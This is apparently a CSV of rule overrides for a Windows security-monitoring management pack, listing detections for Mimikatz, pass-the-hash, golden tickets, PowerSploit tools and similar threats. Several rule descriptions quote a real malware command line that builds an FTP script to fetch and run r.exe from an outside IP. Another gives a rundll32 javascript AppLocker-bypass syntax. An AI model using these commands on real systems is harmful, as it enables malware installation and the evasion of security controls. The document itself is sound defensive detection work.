ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,Enabled,bool,TRUE,,,
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,IntervalSeconds,int,86400,,,
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,TimeoutSeconds,int,60,,,
WindowsEventCollectorDiscovery,WindowsEventCollectorDiscoveryMP.EventLogCollectorServerDiscovery,Discovery,EventLogCollectorServerDiscovery,Description for the new discovery.,SyncTime,string,,,,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.BatchLogon,Rule,Security Monitoring Collection:  Event ID 4624 Logon Type 4,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.BatchLogon,Rule,Security Monitoring Collection:  Event ID 4624 Logon Type 4,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeDLLInjection,Rule,Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeDLLInjection,Rule,Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeDLLInjection,Rule,Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ProhibitedApp,Rule,Security Monitoring Forwarded Events:  Prohibited App in Use,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ProhibitedApp,Rule,Security Monitoring Forwarded Events:  Prohibited App in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ProhibitedApp,Rule,Security Monitoring Forwarded Events:  Prohibited App in Use,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstDC,Rule,Security Monitoring:  Possible PtH attack in progress (successful) against DC,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstDC,Rule,Security Monitoring:  Possible PtH attack in progress (successful) against DC,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstDC,Rule,Security Monitoring:  Possible PtH attack in progress (successful) against DC,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Pth.CredentialSwap,Rule,Security Monitoring: Potential Credential Swap in Progress,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Pth.CredentialSwap,Rule,Security Monitoring: Potential Credential Swap in Progress,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Pth.CredentialSwap,Rule,Security Monitoring: Potential Credential Swap in Progress,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.GoldenTicket,Rule,Security Monitoring Event Collection:  Event ID 4769 result 0x1F,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.GoldenTicket,Rule,Security Monitoring Event Collection:  Event ID 4769 result 0x1F,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.Mimikatz,Rule,Security Monitoring:  Mimikatz in use,Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.Mimikatz,Rule,Security Monitoring:  Mimikatz in use,Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.Mimikatz,Rule,Security Monitoring:  Mimikatz in use,Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly,Rule,Security Monitoring Forwarded Events:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly,Rule,Security Monitoring Forwarded Events:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly,Rule,Security Monitoring Forwarded Events:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetHTTPStatus,Rule,Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetHTTPStatus,Rule,Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetHTTPStatus,Rule,Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreation,Rule,Security Monitoring Forwarded Events:  Service Created on system,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreation,Rule,Security Monitoring Forwarded Events:  Service Created on system,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreation,Rule,Security Monitoring Forwarded Events:  Service Created on system,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,AGPMAccount,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,AGPMDomain,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared,Rule,Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared,Rule,Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared,Rule,Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.GoldenTicketDetection,Rule,Security Monitoring:  Possible Golden Ticket in Use,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.GoldenTicketDetection,Rule,Security Monitoring:  Possible Golden Ticket in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.GoldenTicketDetection,Rule,Security Monitoring:  Possible Golden Ticket in Use,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokePortScan,Rule,Security Monitoring:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokePortScan,Rule,Security Monitoring:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokePortScan,Rule,Security Monitoring:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode in Use,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode in Use,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode in Use,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.RemoteRegSvr32,Rule,Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.RemoteRegSvr32,Rule,Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.RemoteRegSvr32,Rule,Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetKeystroke,Rule,Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetKeystroke,Rule,Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetKeystroke,Rule,Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceKnownThreat,Rule,Security Monitoring:  Service associated with a known threat was created on a member server,"This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceKnownThreat,Rule,Security Monitoring:  Service associated with a known threat was created on a member server,"This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceKnownThreat,Rule,Security Monitoring:  Service associated with a known threat was created on a member server,"This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeMimikatz,Rule,Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeMimikatz,Rule,Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeMimikatz,Rule,Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.PtHTier2,Rule,Security Monitoring Forwarded Events:  Possible PtH Attack in Progress Against Tier 2,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.PtHTier2,Rule,Security Monitoring Forwarded Events:  Possible PtH Attack in Progress Against Tier 2,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.PtHTier2,Rule,Security Monitoring Forwarded Events:  Possible PtH Attack in Progress Against Tier 2,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted,Rule,Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted,Rule,Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted,Rule,Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareRemovedFromServer,Rule,Security Monitoring:  Software was Removed from a Server,This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareRemovedFromServer,Rule,Security Monitoring:  Software was Removed from a Server,This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.,Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareRemovedFromServer,Rule,Security Monitoring:  Software was Removed from a Server,This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats,Rule,Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats,Rule,Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats,Rule,Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.LocalAdminChange,Rule,Security Monitoring:  Local Administrators Group was Modified,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Accounts.LocalAdminChange,Rule,Security Monitoring:  Local Administrators Group was Modified,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.LocalAdminChange,Rule,Security Monitoring:  Local Administrators Group was Modified,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SecurityLogCleared,Rule,Security Monitoring:  Security Log was cleared,"Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.SecurityLogCleared,Rule,Security Monitoring:  Security Log was cleared,"Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.SecurityLogCleared,Rule,Security Monitoring:  Security Log was cleared,"Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.4688.GenericCryptoRansomWare,Rule,Security Monitoring:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.Event.4688.GenericCryptoRansomWare,Rule,Security Monitoring:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.4688.GenericCryptoRansomWare,Rule,Security Monitoring:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.WMIPersistence,Rule,Security Monitoring:  Possible WMI Persistence Event Detected,See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.WMIPersistence,Rule,Security Monitoring:  Possible WMI Persistence Event Detected,See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.WMIPersistence,Rule,Security Monitoring:  Possible WMI Persistence Event Detected,See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.RemoteRegSvr32,Rule,Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.RemoteRegSvr32,Rule,Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.RemoteRegSvr32,Rule,Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess,Rule,Security Monitoring:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess,Rule,Security Monitoring:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess,Rule,Security Monitoring:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.DebugEscalation,Rule,Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.DebugEscalation,Rule,Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.DebugEscalation,Rule,Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerJava,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WinRar,Rule,Security Monitoring:  WinRar in use,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WinRar,Rule,Security Monitoring:  WinRar in use,,Severity,int,2,2,2,
